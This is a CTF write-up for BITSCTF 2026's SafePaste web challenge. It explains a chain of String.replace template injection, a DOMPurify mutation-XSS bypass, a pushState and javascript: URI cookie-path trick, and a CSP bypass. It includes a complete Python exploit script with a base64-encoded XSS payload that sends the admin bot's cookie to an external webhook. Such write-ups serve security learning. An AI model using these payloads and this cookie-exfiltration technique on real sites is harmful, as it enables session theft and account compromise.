---
title: BITSCTF - 2026
description: A Complex Exploit Chain featuring Template Injection, DOMPurify mXSS Bypass, and Cookie Exfiltration via javascript: URI Trick
date: 2026-02-21 00:00:00+0000
image: cover.png
categories:
    - CTF
tags:
    - Web
    - XSS
    - mXSS
    - DOMPurify Bypass
    - Template Injection
    - CSP Bypass
    - Cookie Exfiltration
weight: 100
---

# Writeup: BITSCTF 2026 — SafePaste

**Category:** Web
**Difficulty:** Medium / Hard
**Flag:** `BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}`

---

## Overview

SafePaste is a pastebin-like service where users can create notes and report URLs to an admin bot for review. The goal is to steal the FLAG cookie from the bot.

The source code has two key files:

- `server.ts` — the Express web server
- `bot.ts` — the Puppeteer headless browser (admin bot)

---

## Application Behavior

### Paste Creation & Rendering (`server.ts:36-57`)

```typescript
app.post("/create", (req, res) => {
  const content = req.body.content;
  const id = uuidv4();
  const clean = DOMPurify.sanitize(content);   // sanitize first
  pastes.set(id, clean);
  res.redirect(`/paste/${id}`);
});

app.get("/paste/:id", (req, res) => {
  const content = pastes.get(req.params.id);
  const html = pasteTemplate.replace("{paste}", content);  // then inject into template
  res.type("html").send(html);
});
```

The sanitization happens **before** template rendering. This ordering is the root cause of the entire exploit chain.

### The Template (`views/paste.html`)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SafePaste - View Paste</title>
</head>
<body>
  <nav><a href="/">🔒 SafePaste</a></nav>
  <div class="paste-container">
    <img src="/logo.png" alt="SafePaste">
    <div class="content">{paste}</div>   <!-- our content goes here -->
  </div>
</body>
</html>
```

### The Admin Bot (`bot.ts:21-26`)

```typescript
await page.setCookie({
  name: "FLAG",
  value: FLAG,
  domain: APP_HOST,
  path: "/hidden",   // cookie is ONLY sent on /hidden path
});
await page.goto(url, { waitUntil: "networkidle2", timeout: 5000 });
```

### The `/hidden` Endpoint (`server.ts:79-84`)

```typescript
app.get("/hidden", (req, res) => {
  if (req.query.secret === ADMIN_SECRET) {
    return res.send("Welcome, admin!");
  }
  res.socket?.destroy();  // kill connection if no valid secret
});
```

### Content Security Policy (`server.ts:24-30`)

```
script-src 'unsafe-inline' 'unsafe-eval';
style-src 'self' 'unsafe-inline';
default-src 'self'
```

Inline scripts and `eval()` are allowed, but `fetch`/`XHR`/`sendBeacon` to external domains are **blocked** by `default-src 'self'`.

---

## Stage 1: Template Injection via `String.prototype.replace()`

### The Bug

JavaScript's `String.prototype.replace(search, replacement)` supports special **substitution patterns** inside the replacement string:

| Pattern | Expands to |
|---------|-----------|
| `$$` | Literal `$` |
| `$&` | The matched substring |
| `` $` `` | Everything **before** the match |
| `$'` | Everything **after** the match |

These are processed **automatically** when the replacement is a plain string — no function needed.

### The Effect

The template rendering call is:

```javascript
const html = pasteTemplate.replace("{paste}", content);
//                                              ^^^^^^^
//                              if this contains $`, it expands!
```

The `{paste}` placeholder sits at line 12 of the template. Everything before it is:

```
<!DOCTYPE html>\n<html lang="en">\n<head>\n  ...\n  <div class="content">
```

So if our `content` contains `` $` ``, it gets replaced with the entire chunk of HTML above `{paste}` — **roughly 200+ characters of raw template markup injected inline**.

---

## Stage 2: DOMPurify Bypass via Attribute Breakout (mXSS)

### The Core Idea

We need to pass `` $` `` through DOMPurify without it being stripped, but still have it execute JavaScript after template expansion.

DOMPurify sanitizes HTML by parsing it with the DOM. When it sees an attribute value like `title="..."`, it treats the content as **plain text** — it never parses the inner string as HTML. So any HTML-looking content inside an attribute is completely invisible to DOMPurify's sanitizer.

### The Payload

```html
<p title="$`<img src=x onerror=PAYLOAD>">x</p>
```

**What DOMPurify sees:**
A harmless `<p>` element with a `title` attribute containing some text. It passes sanitization unchanged.

**What happens at template render time:**

The server runs:
```javascript
pasteTemplate.replace("{paste}", '<p title="$`<img src=x onerror=PAYLOAD>">x</p>')
```

The `` $` `` inside the `title` attribute expands into the HTML before `{paste}`:

```html
<p title="<!DOCTYPE html>
<html lang="en">
<head>
  ...
  <div class="content">
<img src=x onerror=PAYLOAD>">x</p>
```

**The browser's HTML parser then sees this and finds a problem:**

The expanded text contains `<html lang="en">`, which has a double-quote character `"` in `lang="en"`. That quote **prematurely closes** the `title` attribute. The browser splits the tag like this:

```
<p title="...bla bla bla" lang="      ← title closes here at the " in lang="en"
en">
...
<div class="content">                 ← the " in class="content" causes another split
<img src=x onerror=PAYLOAD>           ← THIS falls OUTSIDE the <p> tag entirely
">x</p>                               ← stray leftover
```

The `<img>` element is now a **free-standing executable HTML element** — `onerror` fires because `src=x` fails to load. **XSS achieved, DOMPurify completely bypassed.**

This is a classic **mutation XSS (mXSS)** pattern: the HTML is safe when DOMPurify sees it, but becomes dangerous after server-side string manipulation mutates the final output.

### The Full XSS Payload

```python
js_payload = f"""
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
setTimeout(async () => {{
    let w = window.open('/');
    await sleep(500);
    w.history.pushState(1, 1, "/hidden/");
    await sleep(500);
    w.location = 'javascript:"blablabla"';
    await sleep(500);
    location = '{WEBHOOK}?cookie=' + encodeURIComponent(w.document.cookie);
}}, 500);
"""

b64_payload = base64.b64encode(js_payload.encode()).decode()
handler     = f"eval(atob('{b64_payload}'))"
xss_payload = f'<p title="$`<img src=x onerror={handler}>">x</p>'
```

We Base64-encode the real JavaScript and inject it as `eval(atob('...'))` inside the `onerror` attribute. This avoids quote escaping issues and bypasses any naive string filters. We also pad the payload to avoid `=` signs in the Base64 output, which would break the unquoted attribute parsing.

---

## Stage 3: Cookie Exfiltration via `pushState` + `javascript:` URI Trick

### The Problem

The FLAG cookie has `path: "/hidden"`. Browser cookie rules say: **a cookie is only sent (and visible via `document.cookie`) when the page URL matches the cookie's path**.

The bot visits our paste URL at `/paste/<id>` — that path does not match `/hidden`, so `document.cookie` returns nothing there.

We cannot simply navigate to `/hidden` either, because the server has:
```typescript
app.get("/hidden", (req, res) => {
  res.socket?.destroy();  // kills connection without ADMIN_SECRET
});
```

A real GET request to `/hidden` immediately destroys the TCP socket — the bot never gets a usable page.

And `history.pushState({}, '', '/hidden')` alone does not work either. While it changes the URL bar, Chrome's cookie engine is still tied to the **actual network path** of the loaded document. `document.cookie` will still return nothing for the `/hidden` cookie.

### The Three-Step Trick

The solution forces Chrome to **rebuild its security context** from scratch based on the spoofed URL, without ever making a real network request to `/hidden`.

```javascript
// Step 1: Open a new window at a valid path
let w = window.open('/');
await sleep(500);

// Step 2: Change the URL bar to /hidden/ via pushState (no network request)
w.history.pushState(1, 1, '/hidden/');
await sleep(500);

// Step 3: Navigate to a javascript: URI that returns a string
w.location = 'javascript:"blablabla"';
await sleep(500);

// Now read the cookie
console.log(w.document.cookie);  // FLAG=BITSCTF{...} ✓
```

**Why does Step 3 work?**

When you navigate a window to a `javascript:` URI that **evaluates to a string** (not `undefined`), Chrome uses that string as the source of a **brand new HTML document**, similar to `about:blank`. During this document initialization:

- The new document inherits the **current URL** of the window, which we set to `/hidden/` via `pushState`
- Chrome **rebuilds the security context** from scratch based on that URL
- Cookie matching is re-evaluated against `/hidden/` — and the FLAG cookie now matches
- `w.document.cookie` returns the FLAG

This is equivalent to saying: the `javascript:` navigation forces Chrome to "forget" the old document and create a new one. The new document's origin and path are determined by the current URL (`/hidden/`), not the old document's real network path.

**Compared to `pushState` alone:**

| Method | URL Bar | Cookie Visible? |
|--------|---------|----------------|
| Navigate to `/hidden` | `/hidden` | Yes — but server kills the connection |
| `pushState('/hidden')` | `/hidden` | No — Chrome keeps old security context |
| `pushState('/hidden')` + `javascript:"..."` | `/hidden` | **Yes** — security context rebuilt |

### CSP Bypass for Exfiltration

The CSP `default-src 'self'` blocks:
- `fetch('https://webhook.site/...')` — blocked
- `XMLHttpRequest` to external domain — blocked
- `navigator.sendBeacon(...)` — blocked

But **top-level navigation is never blocked by CSP**:

```javascript
// This is NOT an XHR/fetch — it's a plain browser navigation
location = 'https://webhook.site/?cookie=' + encodeURIComponent(w.document.cookie);
```

When `location` is reassigned, the browser performs a standard `GET` request to the webhook URL, carrying the flag as a query parameter. CSP does not apply to navigation. The webhook receives:

```
GET /?cookie=FLAG=BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?...} HTTP/1.1
```

---

## Full Exploit Script

```python
#!/usr/bin/env python3
import requests, time, base64

WEBHOOK = "https://webhook.site/YOUR-ID-HERE"
TARGET  = "http://20.193.149.152:3000"

js_payload = f"""
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
setTimeout(async () => {{
    let w = window.open('/');
    await sleep(500);
    w.history.pushState(1, 1, "/hidden/");
    await sleep(500);
    w.location = 'javascript:"blablabla"';
    await sleep(500);
    location = '{WEBHOOK}?cookie=' + encodeURIComponent(w.document.cookie);
}}, 500);
"""

# Pad to eliminate '=' in Base64 output (would break unquoted attribute)
while len(js_payload.encode()) % 3 != 0:
    js_payload += " "

b64_payload = base64.b64encode(js_payload.encode()).decode()
handler     = f"eval(atob('{b64_payload}'))"
xss_payload = f'<p title="$`<img src=x onerror={handler}>">x</p>'

print(f"[*] Payload length: {len(xss_payload)}")
r = requests.post(f"{TARGET}/create", data={"content": xss_payload}, allow_redirects=False)

paste_url = TARGET + r.headers["Location"]
print(f"[+] Paste created: {paste_url}")

r2 = requests.post(f"{TARGET}/report", data={"url": paste_url})
print(f"[+] Report submitted: {r2.status_code} — {r2.text}")

print("[*] Waiting 20s for bot...")
time.sleep(20)
print("[+] Check your webhook for the flag!")
```

---

## Full Exploit Chain Summary

```
Attacker crafts payload:
  <p title="$`<img src=x onerror=eval(atob('...'))>">x</p>
         │
         ▼
POST /create  →  DOMPurify sees harmless <p title="...">  →  passes ✓
         │
         ▼
GET /paste/<id>  →  pasteTemplate.replace("{paste}", content)
                 →  $` expands into 200+ chars of HTML
                 →  a " inside the expanded HTML closes title early
                 →  <img onerror=...> falls out of the attribute
                 →  browser executes the onerror handler
         │
         ▼
XSS executes eval(atob('...'))  →  runs the cookie theft JS
         │
         ▼
window.open('/')
pushState → '/hidden/'
location = 'javascript:"blablabla"'   →  Chrome rebuilds security context
                                       →  document.cookie now has FLAG
         │
         ▼
location = 'https://webhook.site/?cookie=' + FLAG
         →  plain GET navigation, CSP does not apply
         →  FLAG delivered to attacker's webhook ✓
```

---

## Key Takeaways

| Vulnerability | Root Cause |
|--------------|-----------|
| Template injection | `String.replace()` special patterns not sanitized |
| DOMPurify bypass (mXSS) | Sanitization runs before template expansion; attribute content treated as plain text by DOMPurify but as HTML after mutation |
| Cookie path bypass | Chrome rebuilds security context on `javascript:` navigation after `pushState` |
| CSP bypass | Top-level `location` assignment is not restricted by `default-src` |
